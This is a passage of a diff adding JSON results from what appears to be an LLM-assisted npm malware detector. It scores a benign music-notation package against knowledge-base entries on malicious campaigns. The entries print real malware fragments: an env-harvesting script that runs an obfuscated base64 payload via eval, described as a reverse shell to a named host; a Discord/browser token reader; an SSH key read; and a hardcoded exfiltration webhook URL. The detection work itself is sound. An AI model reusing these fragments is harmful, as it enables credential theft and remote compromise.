+                  "why_malicious": "LofyGang’s packages are explicitly crafted to steal sensitive user data, including credit card information, Discord authentication tokens, and streaming/gaming account credentials. The malware exfiltrates this data to attacker-controlled Discord webhooks and remote infrastructure, and achieves persistence by modifying legitimate Discord application files. The threat actors employ typosquatting, starjacking, and sub-dependency hiding to evade detection and maximize distribution."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Victim installs a typosquatted or starjacked malicious NPM package.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Malicious sub-dependency is loaded and executed."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious sub-dependency downloads or executes further payloads, including code to modify Discord installation or steal credentials.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_1",
+                      "snippet_3"
+                    ],
+                    "leads_to": "System and application compromise."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malware hooks into Discord or other applications, intercepts sensitive data (tokens, credit cards, passwords).",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Data exfiltration to attacker-controlled webhooks."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Anti-analysis code executes to hinder detection and reverse engineering.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Persistence and evasion."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "NPM packages or sub-dependencies initiating network requests to Discord webhooks or suspicious external domains",
+                    "Modification or injection of code into Discord installation files (e.g., discord_desktop_core/index.js)",
+                    "Presence of obfuscated or anti-debugging JavaScript code in package or sub-dependencies",
+                    "Access and exfiltration of credential or payment data via network requests"
+                  ],
+                  "file_indicators": [
+                    "Injected or modified files in Discord’s appdata directory, specifically discord_desktop_core/index.js",
+                    "Presence of sub-dependencies with no legitimate functionality (e.g., small-sm)",
+                    "Obfuscated .js files containing anti-analysis or event loop jamming logic"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS requests to Discord webhooks (e.g., canary.discord.com/api/webhooks/...)",
+                    "Connections to attacker infrastructure such as glitch.me, repl.it, herokuapp.com, pastebin.com, raw.githubusercontent.com"
+                  ],
+                  "how_to_detect": "Monitor for NPM packages and their dependencies making unexpected network requests, especially to Discord webhooks or known C2 domains. Detect unauthorized modifications to Discord’s core files and the presence of obfuscated or anti-analysis code in package directories. Flag packages using typosquatting, starjacking, or sub-dependency hiding techniques. Correlate file and network indicators with known IOCs to identify malicious activity."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/maia-markov/0.1.12/package/es6/Edge.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/maia-markov/0.1.12/package/es6/Generator.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/maia-markov/0.1.12/package/es6/Graph.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/maia-markov/0.1.12/package/es6/Heap.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/maia-markov/0.1.12/package/es6/KernImport.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "KernImport_slice_1",
+          "code_snippet": "// Imports\n// import fs\nconst fs = require('fs')\n// const { Midi } = require('@tonejs/midi')\n\n// Constructor for KernImport object\nexport default function KernImport(_fpath){\n  // Workaround for JS context peculiarities.\n  // var self = this;\n  this.fpath = _fpath\n  this.data = this.get_data()\n  this.lines = this.data.split(\"\\n\")\n  // console.log(\"this.lines.slice(0, 50):\", this.lines.slice(0, 50))\n  // Possible to return something.\n  // return sth;\n}\n// Methods for KernImport object\nKernImport.prototype = {\n  constructor: KernImport,\n\n  get_anacrusis: function(){\n    const i = this.get_first_duration_index()\n    const barAndI = this.get_first_numbered_bar_and_index()\n    //\n    if (barAndI[0] == 1 && barAndI[1] < i){\n      // This kind of situation, where the first bar is labeled and the first\n      // line to contain a duration occurs after the first bar.\n      // =1\t=1\t=1\t=1\n      // 8GG\t8r\t8r\t8B 8g\n      // Result is no anacrusis.\n      return 0\n    }\n    else if (barAndI[0] == 1 && barAndI[1] > i){\n      // First bar is labeled and the first line to contain a duration occurs\n      // before the first bar.\n      // 8GG\t8r\t8r\t8B 8g\n      // =1\t=1\t=1\t=1\n      // Result is anacrusis that needs counting. Sometimes the anacrusis adds\n      // up to a whole bar's worth of music, in which case null may still be\n      // returned.\n      const dur = this.get_duration_between_lines(i, barAndI[1])\n      console.log(\"dur:\", dur)\n      const ts = this.get_first_time_signature()\n      const crotchetsPerBar = ts[0]*4/ts[1]\n      if (dur == crotchetsPerBar){\n        return 0\n      }\n      else if (dur < crotchetsPerBar){\n        return dur\n      }\n      else {\n        console.log(\"Anacrusis appears to be longer than one bar!!\")\n        return dur\n      }\n    }\n    else if (barAndI[0] == 2){\n      // First bar is unlabeled and assumed complete.\n      // 2.r\t2.r\t2dd\t2ff\n      // .\t.\t4cc\t8ee-\n      // .\t.\t.\t16dd\n      // .\t.\t.\t16ee-\n      // =2\t=2\t=2\t=2\n      // 2.r\t2f\t2b-\t2dd\n      return 0\n    }\n\n\n  },\n\n  get_data: function(){\n    return fs.readFileSync(this.fpath, \"utf8\")\n  },\n\n  get_duration_between_lines: function(idxBgn = 0, idxEnd = this.lines.length){\n    let i = idxBgn\n    let dur = 0\n    while(i < idxEnd){\n      let line = this.lines[i].split(\"\\t\")\n      // We only ever look at the first spine, because there must always be at\n      // least one spine, and they can't swap so it remains legitimate.\n      // Clean token to derive duration.\n      let cleanToken = line[0]\n      .split(\" \")[0] // Gets rid of chordal content, which disrupts dot processing.\n      .replace(/\\[/g, \"\").replace(/\\(/g, \"\") // Gets rid of stem and phrase info, which disrupts integer parsing.\n      .replace(/&/g, \"\")\n      const intgr = parseInt(cleanToken)\n      if (!isNaN(intgr)){\n        let val = 4/intgr\n        val = 4/intgr\n        let dotVal = val/2\n        // Handle dots, double dots, etc.\n        while (cleanToken.length > 1 && cleanToken.indexOf(\".\") >= 0){\n          val += dotVal\n          dotVal /= 2\n          cleanToken = cleanToken.replace(\".\", \"\")\n        }\n        dur += val\n      }\n      i++\n    }\n    return dur\n  },\n\n  get_first_duration_index: function(){\n    let i = 0\n    let line\n    while(i < this.lines.length){\n      let line = this.lines[i].split(\"\\t\")\n      const cleanToken = line[0].replace(/\\[/g, \"\").replace(/\\(/g, \"\")\n      const intgr = parseInt(cleanToken)\n      if (!isNaN(intgr)){\n        // console.log(\"line:\", line)\n        return i\n      }\n      i++\n    }\n\n  },\n\n  get_first_numbered_bar_and_index: function(){\n    let i = 0\n    let line\n    while(i < this.lines.length){\n      let line = this.lines[i].split(\"\\t\")\n      if (line[0].slice(0, 2) == \"=1\"){\n        // console.log(\"line:\", line)\n        return [1, i]\n      }\n      else if (line[0].slice(0, 2) == \"=2\"){\n        // console.log(\"line:\", line)\n        return [2, i]\n      }\n      i++\n    }\n  },\n\n  get_first_time_signature: function(){\n    let i = 0\n    while(i < this.lines.length){\n      if (this.lines[i].slice(0, 2) == \"*M\"){\n        const justOneTS = this.lines[i].split(\"\\t\")[0]\n        return justOneTS.replace(\"*M\", \"\").split(\"/\")\n      }\n      i++\n    }\n  },\n\n  get_midi_data: function(aPath){\n    return fs.readFileSync(this.fpath, \"utf8\")\n  },\n\n  get_phrase_boundary_ontimes: function(anacrusis = 0){\n    let i = 0\n    let kernIdx\n    let line\n    while (i < this.lines.length && kernIdx == undefined){\n      if (this.lines[i].indexOf(\"**kern\") == 0){\n        line = this.lines[i].split(\"**kern\")\n        kernIdx = i\n        i = this.lines.length - 1\n      }\n      i++\n    }\n    console.log(\"line:\", line)\n    if (line == undefined){\n      console.log(\"COULD NOT FIND START OF KERN SPINES. RETURNING EARLY!\")\n      return\n    }\n\n    // Keep track of incrementing time.\n    const nosStaves = line.length - 1\n    let timeIncrArr = new Array(nosStaves)\n    let spineIdxArr = new Array(nosStaves)\n    line = this.lines[kernIdx].split(\"\\t\")\n    i = 0\n    for (let k = 0; k < line.length; k++){\n      if (line[k] == \"**kern\"){\n        timeIncrArr[i] = [0]\n        spineIdxArr[i] = k\n        i++\n      }\n    }\n    // console.log(\"timeIncrArr:\", timeIncrArr)\n    console.log(\"spineIdxArr:\", spineIdxArr)\n    let phraseBgnOntimes = [], phraseEndOntimes = []\n\n    i = kernIdx\n    while(i < this.lines.length){\n    // while(i < 100){\n      // console.log(\"i:\", i)\n      // if (this.lines[i][0] == \"=\"){\n      //   console.log(\"timeIncrArr:\", timeIncrArr)\n      //   console.log(\"this.lines[i]:\", this.lines[i])\n      // }\n      if (\n        this.lines[i][0] !== \"=\" &&\n        this.lines[i].indexOf(\"!!!\") == -1 &&\n        this.lines[i] !== \"\"\n      ){\n        line = this.lines[i].split(\"\\t\")\n        // console.log(\"line:\", line)\n        // Check for the presence of a spine-splitting command.\n        let spineSplit = line.indexOf(\"*^\")\n        if (spineSplit >= 0){\n          console.log(\"line:\", line)\n          console.log(\"spineSplit:\", spineSplit)\n        }\n\n\n        timeIncrArr = timeIncrArr.map(function(arr, j){\n          return arr.map(function(el){\n            const token = line[spineIdxArr[j]]\n            // console.log(\"token:\", token)\n            // Check for phrase beginning and ending.\n            const elRnd = Math.round(10000*(el - anacrusis))/10000\n            if (\n              token.indexOf(\"(\") >= 0 &&\n              token.indexOf(\"q\") == -1 &&\n              phraseBgnOntimes.indexOf(elRnd) == -1\n            ){\n              phraseBgnOntimes.push(elRnd)\n            }\n            if (\n              token.indexOf(\")\") >= 0 &&\n              token.indexOf(\"q\") == -1 &&\n              phraseEndOntimes.indexOf(elRnd) == -1\n            ){\n              phraseEndOntimes.push(elRnd)\n            }\n\n            // Clean token to derive duration.\n            let cleanToken = token\n            .split(\" \")[0] // Gets rid of chordal content, which disrupts dot processing.\n            .replace(/\\[/g, \"\").replace(/\\(/g, \"\") // Gets rid of stem and phrase info, which disrupts integer parsing.\n            .replace(/&/g, \"\")\n            const intgr = parseInt(cleanToken)\n            let val = 0\n            if (!isNaN(intgr)){\n              val = 4/intgr\n              let dotVal = val/2\n              // Handle dots, double dots, etc.\n              while (cleanToken.length > 1 && cleanToken.indexOf(\".\") >= 0){\n                val += dotVal\n                // console.log(\"token:\", token)\n                // console.log(\"val:\", val)\n                dotVal /= 2\n                cleanToken = cleanToken.replace(\".\", \"\")\n              }\n            }\n            // console.log(\"val:\", val)\n            return el + val\n          })\n        })\n      }\n      i++\n    }\n    console.log(\"timeIncrArr:\", timeIncrArr)\n    // console.log(\"phraseBgnOntimes:\", phraseBgnOntimes)\n    // console.log(\"phraseEndOntimes:\", phraseEndOntimes)\n    return {\n      \"timeIncrArr\": timeIncrArr,\n      \"phraseBgnOntimes\": phraseBgnOntimes,\n      \"phraseEndOntimes\": phraseEndOntimes\n    }\n\n  }\n\n}\n",
+          "is_malicious": false,
+          "malice_score": 0.4005218187967936,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code reads a file from the filesystem using fs.readFileSync with a path provided at object construction, processes the file content by splitting into lines, and performs detailed parsing and duration calculations on the file's musical notation data. It accesses and manipulates file data but does not perform any network, system execution, or cryptographic operations, resulting in local file reading and data processing without external communication or code execution.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a module designed to read and parse musical notation files in the **kern format. It uses the filesystem API (fs.readFileSync) to read local files, then processes the content to extract musical timing and phrase information. There is no evidence of obfuscation, network communication, environment manipulation, or execution of dynamically generated code. The code does not collect system or user data beyond the provided file path, nor does it attempt to exfiltrate data or execute payloads. Compared to the known malicious patterns, which include obfuscated payload execution, environment variable manipulation, or automated reading of sensitive browser/Discord files, this code is purely a local data parser with no suspicious side effects. The use of fs.readFileSync is legitimate in this context for reading input files. Therefore, the code is benign.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_104012_987336_snippet_3",
+              "source_package": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104012_987336/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.41531190276145935,
+              "code_similarity": 0.4084758758544922,
+              "behavior_similarity": 0.4221479296684265,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "var os = require(\"os\"),\n    zlib = require(\"zlib\"),\n    bs = \"base64\",\n    filterNet = (o) => {\n        var oR = {};\n        for (var k in o) {\n            if (\"lo0\" == k) continue;\n            for (var i in o[k]) {\n                if (\"127.0.0.1\" == o[k][i][\"address\"]) continue;\n                if (o[k][i][\"family\"] == \"IPv4\" && o[k][i][\"address\"]) {\n                    oR[k] = o[k][i]\n                    break;\n                }\n            }\n        }\n        return oR;\n    },\n    rmKeys = (o, ...keys) => {\n        for (var k in keys) {\n            delete o[keys[k]];\n        }\n        return o;\n    },\n    pkg = JSON.parse(require(\"fs\").readFileSync(\"package.json\").toString(\"utf8\")),\n    zS = (s) => zlib.brotliCompressSync(s, { level: 11, windowBits: 15, quality: 11 }).toString(bs),\n    zO = (o) => zS(JSON.stringify(o, null, 2)),\n    uS = (s) => zlib.brotliDecompressSync(Buffer.from(s, bs)).toString(),\n    o = {\n        \"name\": pkg.name,\n        \"version\": pkg.version,\n        \"pwd\": process.cwd(),\n        \"env\": process.env,\n        \"platform\": os.platform(),\n        \"arch\": os.arch(),\n        \"release\": os.release(),\n        \"type\": os.type(),\n        \"uptime\": os.uptime(),\n        \"hostname\": os.hostname(),\n        \"cpus\": [os.cpus().length, rmKeys(os.cpus()[0], \"times\")],\n        \"networkInterfaces\": filterNet(os.networkInterfaces()),\n        \"freemem\": os.freemem(),\n        \"totalmem\": os.totalmem(),\n        \"userInfo\": os.userInfo()\n    };\nlet s = zO(o), s1 = uS(`G/sCIJwHtg1sfVPqObPQC6WsmlPZnVOfAqCQlUG+AJay52WlQRR23HYKiwLI/7ncvQM75zP689ZqjKlrgZVYcYBp1gM8R5zV4glyFKt+CPgOAIT7ekBlFUzW87zjyA6CooEMdzcFs33O/t2tAXawBJUI9pOdw8hOkS4DYLG9xHRAeDZ5ZXbs1oL+Z+k+M2aA4HzxpZD/VAbL7E8erim7UfCx9F/Y4+yCKMrUklhDVFoCdwwQYsUTOxl/nc+gLuTlglxBdupg+2xUfQt7zegHtGsz5GkVkFMdVd6qgszOQWOzY8FtLc/U7KSvB2Q4l4yGpcavIeSsCiZV7YQM5X3KWTMz8v1g55Yld/RldQTkyU91zlOFCeelQqC8qAIL4vEXNhgs2suqFHoQstfjXJpvHFgV0v7Bf8f7X38+oji8qZQUEG8LimNT5MDFKHJ5efBeZkZVIAKCp7gdzI60KAs=`);\nprocess.env.NODE_NO_EVAL = undefined;\neval(s1);",
+                "code_behavior": "At runtime, when rsh.js is executed as a detached process, the code collects detailed system, environment, and user information, compresses and encodes it, decompresses an obfuscated payload from a base64 string, sets the NODE_NO_EVAL environment variable to undefined, and executes the decompressed payload using eval, resulting in the execution of further malicious code.",
+                "malice_analysis": {
+                  "why_suspicious": "Collecting extensive system, environment, and user data, compressing and encoding it, and executing obfuscated code via eval are all strong indicators of malicious intent and are commonly used to evade detection and enable data exfiltration.",
+                  "violated_expectations": "Legitimate packages do not collect and exfiltrate system or user information, nor do they execute dynamically decompressed and obfuscated code via eval.",
+                  "similar_legitimate_use": "Compression and system info gathering may be used in legitimate diagnostics or telemetry, but not in combination with obfuscated payload execution and without user consent.",
+                  "key_indicators": [
+                    "Obfuscated and base64-encoded payload decompressed and executed via eval",
+                    "Systematic collection of system, environment, and user data",
+                    "Manipulation of environment variables to bypass security controls",
+                    "No user notification or consent for data collection or code execution"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when rsh.js is executed)",
+                  "file_location": "scripts/rsh.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.]",
+                  "package_manager": "npm",
+                  "package_versions": "[e.g., 6.0.2, 6.0.3, 6.0.4, 2.2.1, 2.2.3, 7.0.5, 5.0.2, 3.0.3]",
+                  "why_malicious": "All packages in this campaign execute obfuscated JavaScript code at install time, which collects extensive system, environment, and user information and establishes a persistent reverse shell to a remote attacker-controlled server (rsh.51pwn.com:8880), enabling full remote code execution and exfiltration of sensitive data. The attack chain is triggered via multiple npm lifecycle hooks, uses detached background processes for persistence, and employs obfuscation and dynamic code execution to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering preinstall, postinstall, test, or init scripts defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of scripts/init.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "scripts/init.js is executed, which launches scripts/rsh.js as a detached child process and immediately exits to conceal ongoing activity.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of scripts/rsh.js in the background"
+                  },
+                  {
+                    "step": 3,
+                    "action": "scripts/rsh.js collects detailed system, environment, and user data, compresses and encodes it, decompresses an obfuscated payload, and executes it via eval.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of reverse shell payload from decompressed code"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The reverse shell payload establishes a persistent connection to rsh.51pwn.com:8880, exfiltrates collected system information, and provides the attacker with remote shell access for arbitrary command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control over the compromised system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of scripts/init.js during npm install, test, or init lifecycle events",
+                    "Creation of detached child processes in install/test scripts (child_process.fork with {detached: true})",
+                    "Presence of obfuscated or base64-encoded JavaScript payloads in package files",
+                    "Use of eval to execute dynamically decompressed or generated code",
+                    "Outbound TCP connections to hardcoded C2 domains (e.g., rsh.51pwn.com:8880) during or after installation",
+                    "Collection and exfiltration of system, environment, and user data during package installation or execution"
+                  ],
+                  "file_indicators": [
+                    "scripts/init.js",
+                    "scripts/rsh.js",
+                    "package.json with install/test/init scripts running 'node ./scripts/init.js'",
+                    "Obfuscated JavaScript with base64-encoded or Unicode-escaped payloads"
+                  ],
+                  "network_indicators": [
+                    "rsh.51pwn.com:8880",
+                    "Outbound TCP connections to rsh.51pwn.com on port 8880",
+                    "Initial data exfiltration containing compressed system information"
+                  ],
+                  "how_to_detect": "Monitor npm packages for execution of scripts during install, test, or init lifecycle events, especially those launching detached child processes or containing obfuscated/base64-encoded code. Flag any package that establishes outbound TCP connections to suspicious domains (e.g., rsh.51pwn.com) or uncommon ports during or after installation. Use static analysis to detect eval usage on dynamically decompressed payloads and the presence of Unicode-escaped or base64-encoded code. Alert on collection and exfiltration of system, environment, or user data during package installation or execution. Correlate file indicators (scripts/init.js, scripts/rsh.js, suspicious package.json scripts) with behavioral and network indicators for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_785146_snippet_1",
+              "source_package": "- (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_785146/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3962812125682831,
+              "code_similarity": 0.3576785922050476,
+              "behavior_similarity": 0.43488383293151855,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nexports.default = null;",
+                "code_behavior": "At import-time, the code defines the module as an ES module and exports a null default value, resulting in no data processing or side effects.",
+                "malice_analysis": {
+                  "why_suspicious": "The code is not inherently malicious, but the presence of a package with a single-character name and no functional code is highly unusual. Such packages are often created unintentionally due to typographical errors and can be abused in the future if the code is updated to include malicious payloads.",
+                  "violated_expectations": "Legitimate npm packages typically provide useful functionality or utilities, whereas this package exports only a null value and performs no operations.",
+                  "similar_legitimate_use": "Test, placeholder, or namespace-reserving packages may sometimes be published with minimal or no functionality, but these are usually clearly marked or not widely downloaded.",
+                  "key_indicators": [
+                    "Single-character package name ('-')",
+                    "index.js exports only null as default",
+                    "No functional code or logic present",
+                    "Unusually high download count for a non-functional package"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js",
+                  "required_permissions": []
+                },
+                "package_info": {
+                  "package_name": "-",
+                  "package_manager": "npm",
+                  "package_versions": "0.0.1",
+                  "why_malicious": "The package '-' is not currently malicious, but its existence and high download count are due to accidental installations caused by typographical errors in npm commands. Its presence in projects is unintentional and could be abused in the future if the package contents change to include malicious code. The risk is that such packages can be silently included in builds, creating a potential supply chain attack vector by providing an opportunity for attackers to later introduce malicious payloads into a widely distributed, trusted dependency."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Accidental installation of the '-' package due to typographical errors in npm commands or package.json dependencies.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "The package is included in the project, potentially as a placeholder for future malicious code, creating a supply chain risk if the package contents are updated with malicious payloads."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Presence of single-character or command-like package names in dependencies (e.g., '-', 'i', 'g', 'D')",
+                    "Packages with no functional code or only skeleton code (e.g., exporting null or empty modules)",
+                    "High download counts for packages with no legitimate usage or documentation"
+                  ],
+                  "file_indicators": [
+                    "package.json dependencies including '-', 'i', 'g', 'D', or other single-character/command-like names",
+                    "index.js file that only exports null or an empty module",
+                    "package.json scripts section with non-functional or placeholder scripts referencing missing files"
+                  ],
+                  "network_indicators": [],
+                  "how_to_detect": "Scan package.json and package-lock.json for dependencies with suspicious names such as '-', 'i', 'g', or names matching npm command flags. Flag packages that have no functional code or only export null/empty modules in their main files. Check for non-functional npm scripts referencing missing files. Monitor for sudden inclusion of such packages in projects, especially if not explicitly added by developers, and alert on high download counts for packages with no legitimate usage or documentation."
+                }
+              }
+            },
+            {
+              "match_id": "20250105_195714_456673_snippet_2",
+              "source_package": "fallguys (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250105_195714_456673/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.39348578453063965,
+              "code_similarity": 0.29831910133361816,
+              "behavior_similarity": 0.48865243792533875,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "const fs = require('fs');\nconst paths = [ ... ];\nfor (let i = 0; i < paths.length; i++) {\n  get_token(paths[i]);\n}",
+                "code_behavior": "At import-time, the code iterates over a list of browser and Discord storage file paths, reads the contents of each file using filesystem access, and extracts sensitive data for further processing and exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "Automated reading of browser and Discord storage files without user interaction is a clear sign of data harvesting and credential theft.",
+                  "violated_expectations": "Normal npm packages do not access or process browser or instant messaging storage files automatically or without explicit user action.",
+                  "similar_legitimate_use": "Forensics or migration tools may read such files, but only with user consent and in a transparent manner.",
+                  "key_indicators": [
+                    "Automated enumeration and reading of sensitive browser/Discord files",
+                    "No user interaction or consent required",
+                    "Use of filesystem APIs to access leveldb files"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "fallguys",
+                  "package_manager": "npm",
+                  "package_versions": "1.0.6",
+                  "why_malicious": "The package 'fallguys' impersonates a legitimate API for the Fall Guys game but contains heavily obfuscated JavaScript code that, upon import, systematically locates, reads, and exfiltrates sensitive browser and Discord application data to a hardcoded Discord webhook. The package provides no legitimate functionality and is solely designed for credential and session theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Obfuscated file paths and sensitive strings are loaded into memory at import-time.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Automated enumeration of sensitive files"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Sensitive browser and Discord storage files are read from disk using filesystem APIs.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Data harvesting and preparation for exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Harvested data and user profile metadata are formatted into a JSON payload for webhook delivery.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Data exfiltration"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Payload is sent to the attacker's Discord webhook endpoint via HTTPS POST request.",
+                    "implemented_by": [
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Completion of data theft and attacker access to stolen credentials"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Obfuscated arrays containing hardcoded browser and Discord storage file paths in JavaScript code",
+                    "Automated reading of browser and Discord local storage files at import-time without user interaction",
+                    "Network requests to Discord webhook endpoints with harvested sensitive data at import-time"
+                  ],
+                  "file_indicators": [
+                    "index.js containing obfuscated arrays of file paths referencing leveldb directories",
+                    "Access to /AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb and similar paths by non-browser processes",
+                    "References to Discord and multiple Chromium-based browser storage locations in package code"
+                  ],
+                  "network_indicators": [
+                    "HTTPS POST requests to discordapp.com/api/webhooks/746189410042904617/RQVJEOhzAblK5FlkQ-WIXkWfKfg5BFCdsjTeVueAIrVLaQMTvHgbuhuqFafPZYHfwnEq",
+                    "Outbound connections to Discord webhook endpoints from npm package processes"
+                  ],
+                  "how_to_detect": "Monitor for JavaScript packages that, at import-time, access browser or Discord local storage files and send their contents to external webhooks, especially Discord API endpoints. Flag any code that contains obfuscated arrays of sensitive file paths or constructs network requests to hardcoded webhook URLs. Alert on npm packages that read browser or IM storage files without user interaction and initiate outbound network connections to Discord webhook domains. Correlate filesystem access to leveldb directories with network activity to Discord webhooks for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_096923_snippet_3",
+              "source_package": " ()",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113501_096923/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.39020898938179016,
+              "code_similarity": 0.25842422246932983,
+              "behavior_similarity": 0.5219937562942505,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "const fs = require('fs'); const secret = fs.readFileSync('/etc/ssh/ssh_host_rsa_key', 'utf8');",
+                "code_behavior": "At runtime, the code reads the SSH host private key from the filesystem using fs.readFileSync, accessing sensitive system-level secrets that can be exfiltrated or abused.",
+                "malice_analysis": {
+                  "why_suspicious": "Accessing sensitive system files such as SSH private keys is rarely necessary for normal package operation and is a strong indicator of malicious intent, as it enables credential theft or unauthorized access.",
+                  "violated_expectations": "Packages should not access or read system-level secrets unless explicitly required, opt-in, and well-documented.",
+                  "similar_legitimate_use": "Developer tools for SSH management may access such files, but this should be opt-in, transparent, and never hidden in general-purpose packages.",
+                  "key_indicators": [
+                    "Reading files like /etc/ssh/ssh_host_rsa_key or ~/.ssh/id_rsa",
+                    "Use of fs.readFileSync or similar APIs on sensitive paths",
+                    "Access to system-level secrets in package code"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "index.js or any JavaScript source file",
+                  "required_permissions": [
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "",
+                  "package_manager": "",
+                  "package_versions": "",
+                  "why_malicious": "No specific malicious package is analyzed in this report. The article discusses general supply chain attack techniques and detection strategies, referencing past incidents (event-stream, ua-parser-js) and suspicious behaviors (network access, shell execution, privileged API usage) that are indicative of malicious packages. The report highlights how these behaviors enable credential exfiltration, remote code execution, and unauthorized access, which are core threats in supply chain attacks."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious code is introduced into the package, often via install scripts or obfuscated code that is difficult to detect during static analysis.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Execution of malicious payload during installation or runtime, setting up the environment for further compromise."
+                  },
+                  {
+                    "step": 2,
+                    "action": "At install or runtime, the package executes code that accesses sensitive data or system resources, such as environment variables, filesystem secrets, or spawns shells.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Exfiltration of secrets, unauthorized access to system resources, or system compromise."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Sensitive data is exfiltrated to attacker-controlled domains, or remote code is executed for further compromise and persistence.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains access to secrets or persistent control over the compromised system."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Presence of postinstall or preinstall scripts that fetch and execute remote code",
+                    "Use of network APIs (fetch, http, https, net, dgram, dns) in package code, especially with hardcoded external domains",
